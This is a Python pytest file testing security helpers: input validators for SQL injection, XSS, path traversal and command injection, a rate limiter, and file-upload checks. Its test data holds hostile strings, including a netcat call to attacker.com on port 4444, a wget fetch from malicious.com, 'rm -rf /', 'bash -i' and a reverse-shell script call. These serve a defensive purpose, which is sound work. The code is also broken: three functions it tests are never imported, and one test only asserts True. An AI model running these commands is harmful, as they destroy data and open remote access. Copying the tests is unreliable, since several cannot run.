"""Comprehensive tests for security utilities."""

import pytest
from unittest.mock import MagicMock, patch

from app.utils.security import (
    SecurityError,
    InputValidator,
    RateLimiter,
    require_security_validation
)


class TestSecurityError:
    """Test cases for SecurityError exception."""

    def test_security_error_creation(self):
        """Test SecurityError can be created and raised."""
        with pytest.raises(SecurityError) as exc_info:
            raise SecurityError("Test security error")

        assert str(exc_info.value) == "Test security error"

    def test_security_error_inheritance(self):
        """Test SecurityError inherits from Exception."""
        error = SecurityError("test")
        assert isinstance(error, Exception)


class TestInputValidator:
    """Test cases for InputValidator class."""

    def test_sanitize_string_basic(self):
        """Test basic string sanitization."""
        result = InputValidator.sanitize_string("Hello World")
        assert result == "Hello World"

    def test_sanitize_string_html_escape(self):
        """Test HTML escaping in string sanitization."""
        result = InputValidator.sanitize_string("<script>alert('xss')</script>")
        assert result == "&lt;script&gt;alert('xss')&lt;/script&gt;"

    def test_sanitize_string_control_characters(self):
        """Test removal of control characters."""
        # String with null byte and control characters
        dangerous = "Hello\x00\x01\x02World\x7f\xff"
        result = InputValidator.sanitize_string(dangerous)
        assert result == "HelloWorld"

    def test_sanitize_string_whitespace_strip(self):
        """Test whitespace stripping."""
        result = InputValidator.sanitize_string("  Hello World  ")
        assert result == "Hello World"

    def test_sanitize_string_max_length(self):
        """Test string length validation."""
        long_string = "a" * 1001

        with pytest.raises(SecurityError) as exc_info:
            InputValidator.sanitize_string(long_string, max_length=1000)

        assert "String too long" in str(exc_info.value)

    def test_sanitize_string_custom_max_length(self):
        """Test string with custom max length."""
        result = InputValidator.sanitize_string("Hello", max_length=10)
        assert result == "Hello"

    def test_sanitize_string_non_string_input(self):
        """Test sanitization with non-string input."""
        with pytest.raises(SecurityError) as exc_info:
            InputValidator.sanitize_string(12345)

        assert "Expected string, got" in str(exc_info.value)

    def test_validate_against_patterns_clean_input(self):
        """Test pattern validation with clean input."""
        patterns = [r"(SELECT|INSERT)", r"(<script>)"]

        # Should not raise exception for clean input
        InputValidator.validate_against_patterns("Hello World", patterns, "Test validation")

    @patch('app.utils.security.logger')
    def test_validate_against_patterns_malicious_input(self, mock_logger):
        """Test pattern validation with malicious input."""
        patterns = [r"(SELECT|INSERT)", r"(<script>)"]

        with pytest.raises(SecurityError) as exc_info:
            InputValidator.validate_against_patterns("SELECT * FROM users", patterns, "SQL injection")

        assert "SQL injection" in str(exc_info.value)
        assert "Suspicious pattern detected" in str(exc_info.value)
        mock_logger.warning.assert_called_once()

    def test_validate_sql_injection_clean(self):
        """Test SQL injection validation with clean input."""
        clean_input = "This is a normal search query"
        result = InputValidator.validate_sql_injection(clean_input)
        assert result == clean_input

    def test_validate_sql_injection_malicious(self):
        """Test SQL injection validation with malicious input."""
        malicious_inputs = [
            "SELECT * FROM users WHERE id = 1",
            "'; DROP TABLE users; --",
            "1 OR 1=1",
            "UNION SELECT password FROM accounts"
        ]

        for malicious in malicious_inputs:
            with pytest.raises(SecurityError):
                InputValidator.validate_sql_injection(malicious)

    def test_validate_xss_clean(self):
        """Test XSS validation with clean input."""
        clean_input = "This is normal text with <b>bold</b> tags"
        result = InputValidator.validate_xss(clean_input)
        assert result == clean_input

    def test_validate_xss_malicious(self):
        """Test XSS validation with malicious input."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img onload='alert(1)'>",
            "<iframe src='malicious.com'></iframe>",
            "<object data='malicious.com'></object>",
            "<embed src='malicious.com'></embed>"
        ]

        for malicious in malicious_inputs:
            with pytest.raises(SecurityError):
                InputValidator.validate_xss(malicious)

    def test_validate_path_traversal_clean(self):
        """Test path traversal validation with clean paths."""
        clean_paths = [
            "normal/file/path.txt",
            "uploads/image.jpg",
            "documents/report.pdf"
        ]

        for clean_path in clean_paths:
            result = InputValidator.validate_path_traversal(clean_path)
            assert result == clean_path

    def test_validate_path_traversal_malicious(self):
        """Test path traversal validation with malicious paths."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\windows\\system32\\config",
            "%2e%2e/etc/passwd",
            "normal/../../../sensitive/file"
        ]

        for malicious_path in malicious_paths:
            with pytest.raises(SecurityError):
                InputValidator.validate_path_traversal(malicious_path)

    def test_validate_command_injection_clean(self):
        """Test command injection validation with clean input."""
        clean_input = "normal file search query"
        result = InputValidator.validate_command_injection(clean_input)
        assert result == clean_input

    def test_validate_command_injection_malicious(self):
        """Test command injection validation with malicious input."""
        malicious_inputs = [
            "file; rm -rf /",
            "search && wget malicious.com/script",
            "query | nc attacker.com 4444",
            "input `python malicious.py`",
            "text; bash -i",
            "data && sh reverse_shell.sh"
        ]

        for malicious in malicious_inputs:
            with pytest.raises(SecurityError):
                InputValidator.validate_command_injection(malicious)

    def test_comprehensive_validation_clean(self):
        """Test comprehensive validation with clean input."""
        clean_input = "This is a normal user input string"
        result = InputValidator.comprehensive_validation(clean_input)
        assert result == clean_input

    def test_comprehensive_validation_malicious(self):
        """Test comprehensive validation with various malicious inputs."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "SELECT * FROM users",
            "../../../etc/passwd",
            "input; rm -rf /"
        ]

        for malicious in malicious_inputs:
            with pytest.raises(SecurityError):
                InputValidator.comprehensive_validation(malicious)

    def test_validate_json_structure_valid(self):
        """Test JSON structure validation with valid JSON."""
        valid_json = {"name": "John", "age": 30, "city": "New York"}
        result = InputValidator.validate_json_structure(valid_json)
        assert result == valid_json

    def test_validate_json_structure_with_nested_objects(self):
        """Test JSON validation with nested objects."""
        nested_json = {
            "user": {
                "profile": {
                    "name": "John Doe",
                    "settings": ["option1", "option2"]
                }
            }
        }
        result = InputValidator.validate_json_structure(nested_json)
        assert result == nested_json

    def test_validate_json_structure_malicious_strings(self):
        """Test JSON validation with malicious string values."""
        malicious_json = {
            "search": "<script>alert('xss')</script>",
            "query": "SELECT * FROM users"
        }

        with pytest.raises(SecurityError):
            InputValidator.validate_json_structure(malicious_json)

    def test_validate_json_structure_deep_nesting(self):
        """Test JSON validation with excessive nesting."""
        # Create deeply nested structure
        deep_json = {"level1": {"level2": {"level3": {"level4": {"level5": "value"}}}}}

        with pytest.raises(SecurityError) as exc_info:
            InputValidator.validate_json_structure(deep_json, max_depth=3)

        assert "exceeds maximum depth" in str(exc_info.value)


class TestSecureFilename:
    """Test cases for secure_filename function."""

    def test_secure_filename_normal(self):
        """Test secure filename with normal input."""
        result = secure_filename("document.pdf")
        assert result == "document.pdf"

    def test_secure_filename_with_spaces(self):
        """Test secure filename with spaces."""
        result = secure_filename("my document.pdf")
        assert result == "my_document.pdf"

    def test_secure_filename_with_special_chars(self):
        """Test secure filename with special characters."""
        result = secure_filename("file@#$%^&*().txt")
        assert "file" in result
        assert result.endswith(".txt")
        assert "@#$%^&*()" not in result

    def test_secure_filename_path_traversal(self):
        """Test secure filename removes path traversal."""
        result = secure_filename("../../etc/passwd")
        assert ".." not in result
        assert "/" not in result
        assert result != "../../etc/passwd"

    def test_secure_filename_unicode(self):
        """Test secure filename with unicode characters."""
        result = secure_filename("файл.txt")
        # Should handle unicode appropriately
        assert len(result) > 0
        assert result.endswith(".txt") or "txt" in result

    def test_secure_filename_empty(self):
        """Test secure filename with empty input."""
        result = secure_filename("")
        assert result == "unnamed_file"

    def test_secure_filename_only_extension(self):
        """Test secure filename with only extension."""
        result = secure_filename(".txt")
        assert "unnamed" in result or "file" in result


class TestRateLimiter:
    """Test cases for RateLimiter class."""

    def test_rate_limiter_initialization(self):
        """Test RateLimiter initialization."""
        limiter = RateLimiter(max_requests=10, window_seconds=60)
        assert limiter.max_requests == 10
        assert limiter.window_seconds == 60
        assert isinstance(limiter.requests, dict)

    def test_rate_limiter_allow_request_within_limit(self):
        """Test rate limiter allows requests within limit."""
        limiter = RateLimiter(max_requests=5, window_seconds=60)

        # Should allow first 5 requests
        for i in range(5):
            assert limiter.is_allowed("test_key") == True

    def test_rate_limiter_deny_request_over_limit(self):
        """Test rate limiter denies requests over limit."""
        limiter = RateLimiter(max_requests=2, window_seconds=60)

        # Allow first 2 requests
        assert limiter.is_allowed("test_key") == True
        assert limiter.is_allowed("test_key") == True

        # Deny 3rd request
        assert limiter.is_allowed("test_key") == False

    def test_rate_limiter_different_keys(self):
        """Test rate limiter handles different keys separately."""
        limiter = RateLimiter(max_requests=2, window_seconds=60)

        # Each key should have its own limit
        assert limiter.is_allowed("key1") == True
        assert limiter.is_allowed("key2") == True
        assert limiter.is_allowed("key1") == True
        assert limiter.is_allowed("key2") == True

        # Both keys should now be at limit
        assert limiter.is_allowed("key1") == False
        assert limiter.is_allowed("key2") == False

    @patch('app.utils.security.time.time')
    def test_rate_limiter_window_expiry(self, mock_time):
        """Test rate limiter window expiry."""
        limiter = RateLimiter(max_requests=2, window_seconds=60)

        # Set initial time
        mock_time.return_value = 1000.0

        # Use up the limit
        assert limiter.is_allowed("test_key") == True
        assert limiter.is_allowed("test_key") == True
        assert limiter.is_allowed("test_key") == False

        # Move time forward past the window
        mock_time.return_value = 1070.0  # 70 seconds later

        # Should allow requests again
        assert limiter.is_allowed("test_key") == True

    def test_rate_limiter_cleanup_old_entries(self):
        """Test rate limiter cleans up old entries."""
        limiter = RateLimiter(max_requests=5, window_seconds=60)

        with patch('app.utils.security.time.time') as mock_time:
            # Add entries at different times
            mock_time.return_value = 1000.0
            limiter.is_allowed("key1")

            mock_time.return_value = 1030.0  # 30 seconds later
            limiter.is_allowed("key2")

            mock_time.return_value = 1100.0  # 100 seconds from start

            # Trigger cleanup by making a request
            limiter.is_allowed("key3")

            # Old entries should be cleaned up
            # key1 should be removed (older than 60 seconds)
            # This is implementation-dependent, so we just check no errors occurred
            assert True


class TestRateLimiterDecorator:
    """Test cases for rate_limiter decorator."""

    def test_rate_limiter_decorator_basic(self):
        """Test basic rate limiter decorator functionality."""
        @rate_limiter(max_requests=2, window_seconds=60)
        def test_function(request):
            return "success"

        # Mock request object
        mock_request = MagicMock()
        mock_request.client.host = "127.0.0.1"

        # Should allow first 2 requests
        result1 = test_function(mock_request)
        result2 = test_function(mock_request)

        assert result1 == "success"
        assert result2 == "success"

        # Third request should raise exception
        with pytest.raises(Exception):  # Depends on implementation
            test_function(mock_request)

    def test_rate_limiter_decorator_custom_key_func(self):
        """Test rate limiter decorator with custom key function."""
        def custom_key_func(request):
            return f"user_{request.user_id}"

        @rate_limiter(max_requests=1, window_seconds=60, key_func=custom_key_func)
        def test_function(request):
            return "success"

        # Mock requests with different user IDs
        mock_request1 = MagicMock()
        mock_request1.user_id = "user1"

        mock_request2 = MagicMock()
        mock_request2.user_id = "user2"

        # Each user should have separate limits
        result1 = test_function(mock_request1)
        result2 = test_function(mock_request2)

        assert result1 == "success"
        assert result2 == "success"


class TestValidateFileUpload:
    """Test cases for validate_file_upload function."""

    @patch('app.utils.security.Path')
    def test_validate_file_upload_valid_file(self, mock_path):
        """Test file upload validation with valid file."""
        mock_file = MagicMock()
        mock_file.filename = "document.pdf"
        mock_file.size = 1024 * 1024  # 1MB

        mock_path_obj = MagicMock()
        mock_path_obj.suffix = ".pdf"
        mock_path.return_value = mock_path_obj

        # Should not raise exception for valid file
        validate_file_upload(mock_file, allowed_extensions=[".pdf"], max_size_mb=5)

    def test_validate_file_upload_no_filename(self):
        """Test file upload validation with no filename."""
        mock_file = MagicMock()
        mock_file.filename = None

        with pytest.raises(SecurityError) as exc_info:
            validate_file_upload(mock_file)

        assert "No filename provided" in str(exc_info.value)

    def test_validate_file_upload_empty_filename(self):
        """Test file upload validation with empty filename."""
        mock_file = MagicMock()
        mock_file.filename = ""

        with pytest.raises(SecurityError) as exc_info:
            validate_file_upload(mock_file)

        assert "No filename provided" in str(exc_info.value)

    @patch('app.utils.security.Path')
    def test_validate_file_upload_invalid_extension(self, mock_path):
        """Test file upload validation with invalid extension."""
        mock_file = MagicMock()
        mock_file.filename = "malicious.exe"

        mock_path_obj = MagicMock()
        mock_path_obj.suffix = ".exe"
        mock_path.return_value = mock_path_obj

        with pytest.raises(SecurityError) as exc_info:
            validate_file_upload(mock_file, allowed_extensions=[".pdf", ".jpg"])

        assert "File type not allowed" in str(exc_info.value)

    def test_validate_file_upload_too_large(self):
        """Test file upload validation with file too large."""
        mock_file = MagicMock()
        mock_file.filename = "large.pdf"
        mock_file.size = 10 * 1024 * 1024  # 10MB

        with pytest.raises(SecurityError) as exc_info:
            validate_file_upload(mock_file, max_size_mb=5)

        assert "File too large" in str(exc_info.value)

    @patch('app.utils.security.Path')
    def test_validate_file_upload_dangerous_filename(self, mock_path):
        """Test file upload validation with dangerous filename."""
        mock_file = MagicMock()
        mock_file.filename = "../../etc/passwd"

        mock_path_obj = MagicMock()
        mock_path_obj.suffix = ""
        mock_path.return_value = mock_path_obj

        with pytest.raises(SecurityError):
            validate_file_upload(mock_file)

    @patch('app.utils.security.Path')
    def test_validate_file_upload_default_parameters(self, mock_path):
        """Test file upload validation with default parameters."""
        mock_file = MagicMock()
        mock_file.filename = "image.jpg"
        mock_file.size = 1024 * 1024  # 1MB

        mock_path_obj = MagicMock()
        mock_path_obj.suffix = ".jpg"
        mock_path.return_value = mock_path_obj

        # Should work with common image/document extensions
        validate_file_upload(mock_file)